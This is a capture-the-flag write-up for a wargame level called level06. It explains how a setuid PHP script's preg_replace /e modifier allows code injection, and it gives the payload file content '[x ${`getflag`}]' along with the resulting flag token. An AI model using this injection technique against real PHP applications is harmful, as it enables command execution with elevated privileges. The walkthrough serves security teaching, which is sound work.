At the home directorie there is a .php file : level06.php.
It is the source code of the program : level06

The program level06 has a setuid bits :

       |
       v
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06

It means that the program is always executed with the right of the user flag06.

<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

The php script is using the function x() with the user argument :
    x($argv[1], $argv[2]);

Then it's opening the file path of the first argument :
    $a = file_get_contents($y);

Finally it's capturing /[x (.*)]/ and executing what was captured "/e" with the eval regex modifier :
    preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

We need to creat a file and give the path as argument :
    file : [x `getflag`]
This won't work beacause the php string analysis won't interpet the matched string "`getflag`"

We need to use the complexe syntax for the interpretation of complexe expression
    file : [x ${`getflag`}]
    ./level06 /tmp/payload

Finaly it gave use an error, but the matched expression is evaluated :

    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1